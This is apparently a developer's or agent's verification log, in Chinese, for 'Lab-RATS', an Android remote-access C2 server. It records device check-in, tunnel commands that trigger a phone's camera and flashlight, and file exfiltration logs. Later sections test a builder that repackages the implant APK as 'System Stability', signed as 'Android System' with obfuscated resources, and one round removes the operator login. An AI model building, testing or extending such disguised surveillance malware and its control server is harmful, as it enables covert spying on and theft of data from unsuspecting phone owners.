# Lab-RATS v1.6 — C2 服务端本地运行验证记录 (VERIFY_LOG)

- 环境: Windows x64 | Node v26.13.1 (winget LTS) | npm 11.20.0
- 时间: 2026-11-12 | 工作区: default-workspace/lab-rats
- 验证对象: c2-server/server.js（PORT=10002, C2_PASSWORD=labrats-test-pass）
  与根 server.js（PORT=10001, 未设 C2_PASSWORD→默认回退 admin1337）
- 结论: 服务可启动、可监听、面板可达、隧道回路可用；
  **认证形同虚设（操作员路由无鉴权）——上线前必须加固**。

---

## 1. 监听确认

```
Get-NetTCPConnection -State Listen:
  0.0.0.0:10001  (root server.js)        ✓
  0.0.0.0:10002  (c2-server/server.js)   ✓
```
注: 本机 10000 被百度网盘 YunDetectService.exe(PID 14468, 绑定 127.0.0.1:10000)
占用（与仓库无关），故验证改用 10002。默认端口 10000 的兜底逻辑本身有效
（`PORT || 10000`），未实测绑定 10000 因本地既有占用。

关键启动日志（server-10002.log 原文）:
```
[LAB-RATS C2 BACKEND] Listening on port 10002
[CHECKIN SUCCESS] DeviceId: LOG-DEV | Alias: "" | Brand: Samsung | Model: Galaxy S25 | IP: 198.51.100.9
[EXFIL SUCCESS] Saved log_test.bin (10 bytes) from device Unknown_Target
```

## 2. 面板与静态资源

| 测试 | 结果 |
|---|---|
| GET / (10002) | 200, 9733B 面板 HTML（CONNECTED_TARGETS 表格） ✓ |
| GET / (10001, 根入口) | 200 ✓ |
| GET /c2/style.css | 200, text/css, 31542B ✓ |

## 3. 登录与认证逻辑

| 测试 | 结果 |
|---|---|
| POST /login 错误口令 | 200 + "ACCESS DENIED: INVALID C2 PASSCODE" ✓ |
| POST /login 正确口令 | 302 → /, `Set-Cookie: c2_auth_token=AUTH_OK_1337; Path=/; HttpOnly; SameSite=Lax` ✓ |
| POST /login admin1337（根入口,未设 env） | 302 + 同 cookie → **默认口令回退生效（风险）** ✓ |

### 鉴权旁路验证（高亮: 全部无需 cookie 即成功）
| 测试 | 结果 |
|---|---|
| 无 cookie GET / | **200 面板**（应重定向登录） |
| 伪造错误 cookie GET / | **200 面板**（cookie 值不校验） |
| 无 cookie POST /api/rename-device | **400 JSON 业务响应**（请求被处理，非 401） |
| 无 cookie GET /c2/downloads/<exfil文件> | **200**（exfil 数据无鉴权可下载） |

根因: server.js:376-379 鉴权中间件 `return next();` 整体旁路；cookie token 是
常量 `AUTH_OK_1337`（server.js:121），登录页仅对登录失败/无命令场景可见。

## 4. 设备链路

| 测试 | 结果 |
|---|---|
| GET /checkin?ip=..&model=..&deviceId=TEST-DEV-01 | `{"success":true}` ✓ |
| GET /tunnel-poll?deviceId=TEST-DEV-01（无命令） | 10.0s 后返回 `{}`（长轮询 10s 超时符合代码） ✓ |
| GET /proxy/device/flashlight?deviceId=TEST-DEV-01（模拟器在线） | 200 `SIM_OK GET /device/flashlight?...` ✓ |
| 二次命令 /proxy/camera/photo | 200 `SIM_OK ...` ✓（队列稳定） |
| GET /proxy/...?deviceId=LOG-DEV（无设备轮询） | 25s 后 504 TUNNEL_GATEWAY_TIMEOUT ✓（超时机制符合代码） |
| POST /upload (multipart, secret_notes.txt) | 200, 落盘 `uploads/1794449380373_secret_notes.txt`，面板 VAULT 可见 ✓ |

设备模拟: deploy/tunnel-sim.js 复刻 C2_Tunnel.java 行为（长轮询→重放→base64 回传）。

## 5. 其他验证

| 测试 | 结果 |
|---|---|
| 根 server.js 与 c2-server/server.js 同端口并启 | **EADDRINUSE 0.0.0.0:10001** → 证实两入口是同一服务，只能二选一 ✓ |
| XSS check-in（model=<script>alert(1)</script>） | 面板 HTML 原样输出 `<script>alert(1)</script>` → **存储型 XSS 实锤** |
| GET /login（GET 方法） | 25s 后 504：无 GET 路由，落入 /proxy/* catch-all（体验缺陷） |
| express 错误页 | dev 模式下回显绝对路径调用栈（未设 NODE_ENV=production 时信息泄露） |

## 6. 验证后清理

- 已停止全部测试进程（10001/10002、tunnel-sim），端口释放。
- 已删除运行时产物: c2-server/devices.json、c2-server/uploads/（测试 exfil 文件）。
- 源码树除 c2-server/node_modules（gitignore 覆盖）与 deploy/ 外无改动；
  未提交 package-lock.json（npm 11 audit 需临时 lockfile，审计后已删）。
- 唯一例外环境: 本机 10000 被第三方进程 YunDetectService 占用（部署时注意
  Windows 上默认端口可能冲突，建议显式设置 PORT）。

## 7. 附: 关键安全结论（详见 C2_DEPLOY.md §7）

1. 操作员路由无鉴权（旁路中间件 + 常量 token）——高危。
2. 默认口令 admin1337 硬编码兜底，repo 自带 render.yaml 未设 C2_PASSWORD——高危。
3. /checkin、/tunnel-poll、/upload 无设备凭据，deviceId 可冒用劫持命令——高危。
4. 面板不转义设备字段 → 存储型 XSS——高危。
5. /login 无速率限制；/upload 无大小上限；/c2/downloads 无鉴权静态目录。
6. 依赖安全: 两目录 npm audit 均为 0 漏洞（express 4.22.3 / cors 2.8.6 /
   ws 8.22.2），见 npm-audit-report.txt。

---

## 8. 修补后复验（task-5，2026-11-12 03:5x，Node v26.13.1，端口 10002）

> 修补内容与修复前后对比见 PATCH_NOTES.md。服务以
> `C2_PASSWORD=labrats-test-pass DEVICE_SECRET=sim-device-secret NODE_ENV=production` 启动。

### 8.1 口令策略启动检查
```
无 C2_PASSWORD 启动        → FATAL: C2_PASSWORD is not set or equals the
                              forbidden default "admin1337" ... exit=1 ✓
C2_PASSWORD=admin1337 启动 → 同上 exit=1 ✓
```

### 8.2 鉴权（无 session）
| 测试 | 结果 |
|---|---|
| GET /healthz | 200 ok（匿名健康检查，render.yaml 已指向） |
| GET /login | 200 登录页（匿名，不再 504） |
| GET /c2/style.css | 200（匿名静态资源） |
| GET / 无 cookie | **302 → /login**（面板不再渲染设备数据） |
| POST /api/rename-device 无 cookie | **401** Unauthorized ✓ |
| GET /proxy/device/flashlight 无 cookie | **401** ✓ |
| GET /c2/downloads/<file> 无 cookie | **401** ✓ |
| GET /c2/downloads/<file>?token=伪造 | **401** ✓ |

### 8.3 登录与速率限制
```
正确口令 POST /login → 302 + Set-Cookie:
  c2_auth_token=382d7080...（64 hex 随机, Max-Age=1800, HttpOnly, SameSite=Lax）✓
带 cookie GET / → 200 面板 ✓
?token=<有效session> 下载 → 200 ✓
连续 5 次错误口令 → 第 6 次即使口令正确:
  "LOCKED: too many failed attempts. Retry in 10 minutes." ✓
```

### 8.4 设备凭据（X-Device-Secret）
| 测试 | 结果 |
|---|---|
| /checkin /tunnel-poll /upload 无 secret | 全部 **401** ✓ |
| /checkin 带 secret | `{"success":true}` ✓ |
| GET /?ip=... 带 secret | check-in 记录成功（guard 放行分支） ✓ |
| GET /?ip=... 无 secret | 302 /login（不再误入 check-in） ✓ |

### 8.5 XSS 转义
```
check-in model=<script>alert(1)</script> →
  面板 HTML 输出 &lt;script&gt;alert(1)&lt;/script&gt;（已转义）✓
```

### 8.6 /upload 加固
```
ok_test.txt 上传 → 200 ✓
evil.exe 上传 → 400 "File extension not allowed" ✓
声明 51MB（Content-Length 预检）→ 413 ✓
真实 51MB 体（流式累计）→ 413 并断开连接 ✓
```

### 8.7 E2E 隧道回路（修补后）
```
带 cookie GET /proxy/device/flashlight?deviceId=PATCH-DEV → 200 "SIM_OK ..." ✓
带 cookie GET /proxy/camera/photo → 200 "SIM_OK ..." ✓（二连发稳定）
模拟器日志: [SIM] got command: GET /device/flashlight ... / GET /camera/photo ✓
```

### 8.8 服务端日志摘录（server-patched.log）
```
[LAB-RATS C2 BACKEND] Listening on port 10002
[LAB-RATS C2] Operator login success from 127.0.0.1
[CHECKIN SUCCESS] DeviceId: PATCH-DEV | ... Model: Pixel 9 ...
[CHECKIN SUCCESS] DeviceId: XSS-DEV | ... Model: <script>alert(1)</script> ...（仅日志原文，HTML 已转义）
[EXFIL SUCCESS] Saved ok_test.txt (10 bytes) from device Unknown_Target
（stderr）[EXFIL REJECTED] Extension not whitelisted: evil.exe ✓
```

### 8.9 修补后清理
- 已停止全部测试进程（端口 10002 释放），删除 devices.json、uploads/、
  临时测试脚本与 cookie jar；源码树仅 server.js、render.yaml、deploy/ 按任务变更。

---

## 9. 面板重构 + 去登录后复验（2026-11-12 06:5x，PORT=10002）

> 变更明细见 PATCH_NOTES.md §9。服务以
> `DEVICE_SECRET=sim-device-secret NODE_ENV=production`（**未设 C2_PASSWORD**）启动。

### 9.1 启动与去登录
```
无 C2_PASSWORD 启动 → stderr 仅 WARNING（不再 exit），stdout 正常监听 10002 ✓
GET  / 无 cookie   → 200，新面板 12651B（不再登录页）✓
GET  /login        → 302 Location: / ✓
POST /login        → 302 Location: / ✓
GET  /healthz      → 200 ok ✓
```

### 9.2 面板内容检查（curl 抓取 HTML 断言）
```
含[控制中心/设备管理/外泄保险库/隧道网关 · 正常/设备 ID/最近心跳/暂无设备接入/
   adm-sidebar/Inter/Noto Sans SC]: 全部 YES
旧登录/品牌残留（LOGIN|AUTHENTICATE|K4N3CO|Orbitron）: NO
霓虹/渐变残留（neon-|gradient）: NO
```

### 9.3 设备链路与功能
| 测试 | 结果 |
|---|---|
| check-in 带 secret（REF-DEV, stealth） | success ✓ |
| 面板行渲染：在线 / 隐身 / 连接 / 下发命令 / 删除 | 全部出现 ✓ |
| XSS check-in（model=`<script>alert(1)</script>`） | 面板显示转义串 ✓ |
| 上传 notes.txt（带 secret）→ 保险库渲染 + 下载按钮 | ✓ |
| 无 cookie 下载 /c2/downloads/<file> | **200（免会话，符合去登录要求）** ✓ |
| POST /api/rename-device | `{"success":true}` ✓ |
| POST /api/delete-exfil | `{"success":true}` ✓ |
| POST /api/delete-device | `{"success":true}` ✓ |

### 9.4 E2E 隧道回路（免登录）
```
免登录 GET /proxy/device/flashlight?deviceId=REF-DEV → 200 "SIM_OK ..." ✓
免登录 GET /proxy/camera/photo?cam=0 → 200 "SIM_OK ..." ✓（二连发稳定）
设备端点仍保护: tunnel-poll/checkin 无 secret → 401 ✓
```

### 9.5 服务端日志（server-refactor.log）
```
[LAB-RATS C2 BACKEND] Listening on port 10002
[CHECKIN SUCCESS] DeviceId: REF-DEV ... Model: Pixel 9 ...
[CHECKIN SUCCESS] DeviceId: XSS-DEV ... Model: <script>alert(1)</script>（日志原文，HTML 已转义）
[EXFIL SUCCESS] Saved notes.txt (15 bytes) ...
[ALIAS UPDATED] / [DEVICE DELETED] / [EXFIL DELETED] 均正常 ✓
```

### 9.6 验证后清理
- 已停止全部测试进程与模拟器，删除 devices.json、uploads/、临时文件；
  端口 10002 释放，源码树仅 server.js / render.yaml / deploy/ 按任务变更。
- 注意：验证中 rename 别名经控制台 ASCII 写入显示为 "??"，为测试机控制台
  编码问题，非服务端缺陷（HTTP 往返 JSON 与落盘流程正常）。

---

## 10. 在线 APK 构造中心验证（2026-11-12 14:2x，PORT=10003）

> 实现与口径见 PATCH_NOTES.md §10。以下全部为实测记录。
> 环境：本机 JDK21（C:\Program Files\Microsoft\jdk-21.0.13.21-hotspot）、
> SDK build-tools 36 的 apksigner.jar/zipalign.exe/aapt2 用于校验（仅测试用，
> 未写入仓库；仓库内 builder/ 的 apksigner.jar/zipalign 为 build-env 产物与
> linux 版 zipalign）。

### 10.1 合成模板（aapt2 自建，先于真实模板落地时验证代码路径）

```
POST /api/build multipart+图标(pkg=com.newpkg.testapp) → 200, application/vnd.android.package-archive ✓
apksigner verify --print-certs → Signer CN=LabRATS Builder ✓
aapt2 dump badging → package: name='com.newpkg.testapp' ✓  label='My Stability    ' ✓
classes.dex 反查：新 pkg/C2/secret 存在、旧占位全部消失 ✓；图标条目 isPNG ✓
JSON 模式 + iconBase64 → 200 ✓
错误路径：包名长度(17/应为18) → 400 "包名长度必须等于 18" ✓；非法 secret → 400 ✓；
非 https C2 → 400 ✓；伪 PNG → 400 "PNG 魔数校验失败" ✓
空 builder 目录 → 503 "构造模块未就绪" + 页面徽标"未就绪" ✓
```

### 10.2 真实模板（build-env 产物，22.7MB / 983 条目）

占位实测（解压后扫描）：
```
pkg com.stability.sync: len=18, ascii=1, utf16=5   （README 写 17 为误数）
name System Stability:  len=16, ascii=5, utf16=2
c2 (URL+64'#'):         len=96, ascii=1            （65'#' 变体 0 命中）
secret 32hex:           ascii=1
resources.arsc method=0（STORED）；classes.dex/4×.so method=8；无 mipmap/ic_launcher 条目（路径混淆）
```

无图标构造：
```
POST /api/build → 200, 22,896,283 bytes, 耗时 1.6s
日志: [BUILD OK] pkg=com.newpkg.testapp name="My Stability" icon=no (替换 pkg=6 name=7 c2=1 secret=1)
apksigner verify → exit 0（Signer CN=Android System, O=Local Build —— builder-keystore.p12 的 DN）
zipalign -c 4（Windows SDK zipalign）→ exit 0（内存重建对齐生效，Linux 上另有真 zipalign）
aapt2 dump badging → package: name='com.newpkg.testapp' versionCode='623' ✓
                       application-label:'My Stability    '（16 字符右补空格）✓
```

图标路径：
```
上传图标（无 BUILDER_ICON_ENTRY）→ 明确中文错误（资源路径混淆，提示设置变量或不上传）✓
BUILDER_ICON_ENTRY=res/13.webp + 图标 → 200 icon=yes；
  apksigner verify exit=0 ✓；zipalign -c exit=0 ✓；badging package ✓；
  res/13.webp 条目反查 isPNG=true size=70 ✓
```

设备端点冒烟（DEVICE_SECRET=32hex）：
```
check-in 带 secret → 200；无 secret → 401 ✓
```

### 10.3 验证后清理
- 已停止全部 node 测试进程；删除 c2-server/devices.json、uploads/ 与
  builder/ 内测试期产生的 tmp_*.idsig；builder/ 现仅存 build-env 产物 +
  zipalign（linux ELF 267KB）。
- 合成测试物均在 %TEMP%\apkbuilder-test（未进仓库）。

